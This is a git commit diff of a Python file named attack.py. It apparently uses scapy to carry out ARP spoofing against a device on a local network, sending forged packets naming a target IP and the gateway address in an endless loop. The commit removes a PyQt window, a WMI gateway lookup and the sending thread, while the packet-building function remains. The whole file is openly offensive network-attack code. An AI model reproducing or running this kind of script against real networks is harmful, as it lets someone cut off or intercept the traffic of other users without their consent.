37b353c702b4ad7e5f2585ae862abfe16c87cd65
gaozixiang1210 <62372581+gaozixiang1210@users.noreply.github.com>
2023-01-10 14:27:14 +0800

    Update attack.py

--- attack.py
+++ attack.py
@@ -5,13 +5,9 @@ from scapy.all import (
     sendp,
     getmacbyip,
     get_if_hwaddr
-
 )
 import signal
 import sys
-from PyQt5.QtWidgets import QWidget, QPushButton, QApplication, QLabel, QFrame
-from PyQt5.QtCore import QCoreApplication, Qt, QThread
-
 
 def build_packet(TargetIp, GateWayAddr):
     print("[-] Obtaining mac from {}".format(TargetIp))  # 打印信息
@@ -25,57 +21,5 @@ def build_packet(TargetIp, GateWayAddr):
     print(pkt)
     return pkt
 
-
 def stop(signal, frame):
     sys.exit(0)
-
-
-def gate(self):
-    # 获取网关地址
-    wmi_obj = wmi.WMI()
-    wmi_sql = "select DefaultIPGateway from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
-    wmi_out = wmi_obj.query(wmi_sql)
-    for dev in wmi_out:
-        gao = dev.DefaultIPGateway[0]
-    return gao
-
-
-class Example(QWidget):
-
-    # print ("DefaultIPGateway:", dev.DefaultIPGateway[0])
-
-    def __init__(self):
-        super().__init__()
-
-        self.initUI()
-
-    def initUI(self):
-        label = QLabel(self)
-        label.resize(200, 100)
-        label.setFrameStyle(QFrame.Panel | QFrame.Sunken)
-        label.setText("点击X关闭程序")
-        label.setAlignment(Qt.AlignBottom | Qt.AlignRight)
-        self.setGeometry(300, 300, 250, 150)
-        self.setWindowTitle('Processing')
-        self.show()
-
-
-
-class Thread(QThread):
-    def __init__(self):
-        super(Thread, self).__init__()
-    def run(self):
-        while True:
-            sendp(packet, inter=2, iface="WLAN")  # inter表示发送包的间隔,iface表示我们的网卡
-
-def ha(ipa):
-    TargetIp = ipa  # 我ipad联网之后分配的ip
-    GateWayAddr = "192.168.0.1"  # 路由器地址/网关地址
-    signal.signal(signal.SIGINT, stop)
-    global packet
-    packet = build_packet(TargetIp, GateWayAddr)
-    thread = Thread()
-    thread.start()
-    app = QApplication(sys.argv)
-    ex = Example()
-    sys.exit(app.exec_())
